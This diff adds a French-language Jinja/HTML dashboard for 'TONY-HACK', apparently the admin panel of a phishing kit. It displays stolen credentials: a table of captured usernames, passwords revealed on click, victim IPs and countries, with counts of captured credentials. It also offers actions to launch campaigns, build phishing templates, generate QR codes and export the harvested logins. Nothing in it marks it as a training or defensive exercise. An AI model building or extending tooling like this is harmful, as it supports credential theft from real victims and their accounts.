@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TONY-HACK | Dashboard</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <!-- Sidebar -->
+    <div class="sidebar">
+        <div class="sidebar-header">
+            <h2>TONY-HACK</h2>
+        </div>
+        
+        <div class="sidebar-user">
+            <div class="avatar" id="userAvatar">
+                <i class="fas fa-user-shield"></i>
+            </div>
+            <div class="user-info">
+                <h4 id="username">{{ session.get('user', 'admin') }}</h4>
+                <p>Administrateur</p>
+            </div>
+        </div>
+        
+        <div class="sidebar-nav">
+            <a href="/" class="nav-item active">
+                <i class="fas fa-home"></i>
+                <span>Dashboard</span>
+            </a>
+            <a href="/campaigns" class="nav-item">
+                <i class="fas fa-bullhorn"></i>
+                <span>Campagnes</span>
+            </a>
+            <a href="/templates" class="nav-item">
+                <i class="fas fa-file-code"></i>
+                <span>Templates</span>
+            </a>
+            <a href="/builder" class="nav-item">
+                <i class="fas fa-code"></i>
+                <span>Builder</span>
+            </a>
+            <a href="/logs" class="nav-item">
+                <i class="fas fa-list"></i>
+                <span>Logs</span>
+            </a>
+            <a href="/statistics" class="nav-item">
+                <i class="fas fa-chart-bar"></i>
+                <span>Statistiques</span>
+            </a>
+            <a href="/settings" class="nav-item">
+                <i class="fas fa-cog"></i>
+                <span>Paramètres</span>
+            </a>
+            <a href="/profile" class="nav-item">
+                <i class="fas fa-user-circle"></i>
+                <span>Profil</span>
+            </a>
+        </div>
+        
+        <div class="sidebar-footer">
+            <a href="/logout" class="nav-item" onclick="return confirmLogout(event)">
+                <i class="fas fa-sign-out-alt"></i>
+                <span>Déconnexion</span>
+            </a>
+        </div>
+    </div>
+    
+    <!-- Main Content -->
+    <div class="main-content">
+        <div class="page-header">
+            <h1 class="page-title">Dashboard <span>Principal</span></h1>
+            <div class="flex items-center gap-2">
+                <button class="btn btn-secondary btn-sm" onclick="toggleDarkMode()">
+                    <i class="fas fa-moon"></i>
+                </button>
+                <button class="btn btn-primary" onclick="refreshStats()">
+                    <i class="fas fa-sync-alt"></i> Actualiser
+                </button>
+            </div>
+        </div>
+        
+        <!-- Stats Cards -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-icon">
+                    <i class="fas fa-file-alt"></i>
+                </div>
+                <div class="stat-info">
+                    <h3>Templates Actifs</h3>
+                    <div class="value">{{ active_templates }}</div>
+                </div>
+            </div>
+            
+            <div class="stat-card">
+                <div class="stat-icon">
+                    <i class="fas fa-key"></i>
+                </div>
+                <div class="stat-info">
+                    <h3>Credentials Capturés</h3>
+                    <div class="value">{{ total_credentials }}</div>
+                </div>
+            </div>
+            
+            <div class="stat-card">
+                <div class="stat-icon">
+                    <i class="fas fa-bullhorn"></i>
+                </div>
+                <div class="stat-info">
+                    <h3>Campagnes</h3>
+                    <div class="value">{{ total_campaigns }}</div>
+                </div>
+            </div>
+            
+            <div class="stat-card">
+                <div class="stat-icon">
+                    <i class="fas fa-globe"></i>
+                </div>
+                <div class="stat-info">
+                    <h3>IP Uniques</h3>
+                    <div class="value" id="uniqueIPs">-</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Recent Captures -->
+        <div class="card">
+            <div class="card-header">
+                <h3><i class="fas fa-clock"></i> Captures Récentes</h3>
+                <a href="/logs" class="btn btn-secondary btn-sm">
+                    Voir tout <i class="fas fa-arrow-right"></i>
+                </a>
+            </div>
+            
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Template</th>
+                            <th>Username</th>
+                            <th>Password</th>
+                            <th>IP</th>
+                            <th>Pays</th>
+                            <th>Date</th>
+                        </tr>
+                    </thead>
+                    <tbody id="recentCaptures">
+                        {% for cred in recent_captures %}
+                        <tr>
+                            <td>
+                                <span class="badge badge-{{ cred.template_name|lower }}">{{ cred.template_name }}</span>
+                            </td>
+                            <td>{{ cred.username }}</td>
+                            <td>
+                                <span class="password-hidden" onclick="togglePassword(this)">••••••••</span>
+                                <span class="password-shown" style="display:none">{{ cred.password }}</span>
+                            </td>
+                            <td><code>{{ cred.ip }}</code></td>
+                            <td>{{ cred.flag }} {{ cred.country }}</td>
+                            <td>{{ cred.timestamp[:16].replace('T', ' ') }}</td>
+                        </tr>
+                        {% endfor %}
+                    </tbody>
+                </table>
+            </div>
+        </div>
+        
+        <!-- Quick Actions -->
+        <div class="card">
+            <div class="card-header">
+                <h3><i class="fas fa-bolt"></i> Actions Rapides</h3>
+            </div>
+            
+            <div class="flex gap-4" style="flex-wrap: wrap;">
+                <button class="btn btn-primary" onclick="window.location.href='/campaigns'">
+                    <i class="fas fa-plus"></i> Nouvelle Campagne
+                </button>
+                <button class="btn btn-secondary" onclick="window.location.href='/builder'">
+                    <i class="fas fa-code"></i> Créer Template
+                </button>
+                <button class="btn btn-secondary" onclick="window.location.href='/templates'">
+                    <i class="fas fa-qrcode"></i> Générer QR Code
+                </button>
+                <button class="btn btn-secondary" onclick="exportLogs()">
+                    <i class="fas fa-download"></i> Exporter Logs
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <div class="toast-container" id="toastContainer"></div>
+    
+    <script>
+        // Fonctions globales
+        function showToast(title, message, type = 'info') {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            
+            let icon = 'info-circle';
+            if (type === 'success') icon = 'check-circle';
+            if (type === 'error') icon = 'exclamation-circle';
+            if (type === 'warning') icon = 'exclamation-triangle';
+            
+            toast.innerHTML = `
+                <i class="fas fa-${icon}"></i>
+                <div class="toast-content">
+                    <div class="toast-title">${title}</div>
+                    <div class="toast-message">${message}</div>
+                </div>
+            `;
+            
+            container.appendChild(toast);
+            
+            setTimeout(() => {
+                toast.style.opacity = '0';
+                toast.style.transform = 'translateX(100%)';
+                setTimeout(() => toast.remove(), 300);
+            }, 4000);
+        }
+        
+        function togglePassword(element) {
+            const parent = element.parentElement;
+            const hidden = parent.querySelector('.password-hidden');
+            const shown = parent.querySelector('.password-shown');
+            
+            if (hidden.style.display !== 'none') {
+                hidden.style.display = 'none';
+                shown.style.display = 'inline';
+            } else {
+                hidden.style.display = 'inline';
+                shown.style.display = 'none';
+            }
+        }
+        
+        function confirmLogout(e) {
+            e.preventDefault();
+            if (confirm('Voulez-vous vraiment vous déconnecter ?')) {
+                window.location.href = '/logout';
+            }
+            return false;
+        }
+        
+        function toggleDarkMode() {
+            document.body.classList.toggle('light-mode');
+            const isDark = !document.body.classList.contains('light-mode');
+            localStorage.setItem('darkMode', isDark);
+            showToast('Thème', `Mode ${isDark ? 'sombre' : 'clair'} activé`, 'info');
+        }
+        
+        function refreshStats() {
+            location.reload();
+        }
+        
+        function exportLogs() {
+            window.location.href = '/api/credentials/export';
+        }
+        
+        // Charger les IPs uniques
+        async function loadUniqueIPs() {
+            try {
+                const response = await fetch('/api/credentials');
+                const data = await response.json();
+                const uniqueIPs = new Set(data.credentials.map(c => c.ip)).size;
+                document.getElementById('uniqueIPs').textContent = uniqueIPs;
+            } catch (e) {
+                console.error('Erreur chargement IPs:', e);
+            }
+        }
+        
+        // Initialisation
+        document.addEventListener('DOMContentLoaded', () => {
+            loadUniqueIPs();
+            
+            // Raccourcis clavier
+            document.addEventListener('keydown', (e) => {
+                if (e.ctrlKey && e.key === 's') {
+                    e.preventDefault();
+                    refreshStats();
+                }
+                if (e.ctrlKey && e.key === 'f') {
+                    e.preventDefault();
+                    window.location.href = '/logs';
+                }
+            });
+        });
+    </script>
+</body>
+</html>
